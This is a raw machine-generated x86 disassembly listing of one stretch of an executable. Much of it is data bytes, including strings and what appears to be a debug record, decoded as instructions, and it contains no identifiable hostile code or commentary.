  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	mov    ah,0x27
  43395a:	test   eax,0x52254138
  43395f:	inc    esi
  433960:	scas   eax,DWORD PTR es:[edi]
  433961:	cwde   
  433962:	mov    ebx,0x41a4c1f4
  433967:	mov    ch,0x1b
  433969:	add    BYTE PTR [eax],al
  43396b:	add    BYTE PTR [edx+edi*1+0x5c],dl
  43396f:	jns    0x4339da
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
